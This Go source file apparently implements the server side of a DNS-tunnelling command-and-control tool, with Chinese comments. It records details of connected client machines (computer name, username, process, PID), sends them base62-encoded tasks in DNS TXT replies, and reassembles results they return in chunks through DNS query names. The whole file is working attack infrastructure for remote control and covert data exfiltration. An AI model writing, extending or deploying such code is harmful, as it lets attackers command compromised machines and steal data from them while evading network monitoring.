package server

import (
	"fmt"
	"github.com/jxskiss/base62"
	"github.com/miekg/dns"
	"strconv"
	"strings"
	"time"
)

//var ResultMap = make(map[string]map[string]string)

//var CmdMap = make(map[string]string)

type Result struct {
	TaskId  string
	AimId   string //客户端Id
	Type    string //任务类型
	Data    string
	tmpData map[string]string
	Date    time.Time
}

var ResultMap = make(map[string]*Result) //

type Task struct {
	Id       string
	AimId    string // 为空时向全部客户端广播
	Type     string //任务类型
	Data     string
	Received bool
	Finished bool
}

var TaskMap = make(map[string]*Task)

type Client struct {
	Id           string
	LocalIP      string
	ComputerName string
	Username     string
	ProcessName  string
	PID          int
	state        int
	Heartbeat    time.Time
}

var ClientMap = make(map[string]Client)

func Addtask(task Task) {
	TaskMap[task.Id] = &task
}

func StartServer() {
	dns.HandleFunc(".", func(w dns.ResponseWriter, req *dns.Msg) {
		var resp dns.Msg
		resp.SetReply(req)
		for _, q := range req.Question {
			str1 := strings.Split(q.Name, ".")
			str2 := strings.Split(str1[0], "-")
			if len(str2) == 2 {
				var client Client
				value, ok := ClientMap[str2[1]]
				if ok {
					client = value
				}
				client.Id = str2[1]
				client.state = 0
				client.Heartbeat = time.Now()
				ClientMap[str2[1]] = client

				for k, v := range TaskMap {
					var data = ""
					if (v.AimId == "" || v.AimId == str2[1]) && (v.Received == false) {
						data = k + "|" + v.Type + "|" + string(base62.Encode([]byte(v.Data)))
						asw := dns.TXT{
							Hdr: dns.RR_Header{
								Name:   q.Name,
								Rrtype: dns.TypeTXT,
								Class:  dns.ClassINET,
								Ttl:    0,
							},
							Txt: []string{data},
						}
						resp.Answer = append(resp.Answer, &asw)
					}
				}

			} else if len(str2) == 3 {

				data, err := base62.Decode([]byte(str2[2]))
				if err == nil {
					//log.Printf(string(data))
				} else {
					//log.Printf("err data :" + str2[2])
					return
				}
				var result *map[string]string //多线程使用局部变量可能会出现丢数据问题 这里直接使用指针访问
				_, ok := TaskMap[str2[0]]
				if ok {
					if TaskMap[str2[0]].Finished != true {
						TaskMap[str2[0]].Received = true
					} else {
						w.WriteMsg(&resp) //来自公共DNS递归服务器的重复请求
						return
					}

				} else {
					fmt.Println("未知任务:" + str2[0])
					w.WriteMsg(&resp)
					return
				}

				_, ok = ResultMap[str2[0]]
				if ok {
					result = &ResultMap[str2[0]].tmpData
				} else {
					var r Result
					r.TaskId = str2[0]
					r.tmpData = make(map[string]string)
					ResultMap[str2[0]] = &r
					result = &ResultMap[str2[0]].tmpData
					fmt.Println("开始接收:" + str2[0])
				}
				(*result)[str2[1]] = string(data)
				if str2[1] == "ffffff" { //收到最后一个分片
					outdata := ""
					for i := 0; i < (len(*result) - 1); i++ {
						value, ok := (*result)[strconv.FormatInt(int64(i), 16)]
						if ok {
							outdata = outdata + value
						} else {
							fmt.Println("损坏的数据 缺少分片:" + strconv.FormatInt(int64(i), 16))
						}
					}
					outdata = outdata + string(data) //加上最后一个分片(当前接收数据)
					fmt.Println(str2[0] + " 接收完毕:\n" + outdata)
					ResultMap[str2[0]].Data = outdata
					ResultMap[str2[0]].tmpData = nil
					ResultMap[str2[0]].Date = time.Now()
					TaskMap[str2[0]].Finished = true

				}

			}

			for range TaskMap {
				asw := dns.TXT{
					Hdr: dns.RR_Header{
						Name:   q.Name,
						Rrtype: dns.TypeTXT,
						Class:  dns.ClassINET,
						Ttl:    0,
					},
					Txt: []string{"ok"},
				}
				resp.Answer = append(resp.Answer, &asw)
			}
		}
		w.WriteMsg(&resp)
	})
	go dns.ListenAndServe(":53", "udp", nil)
}
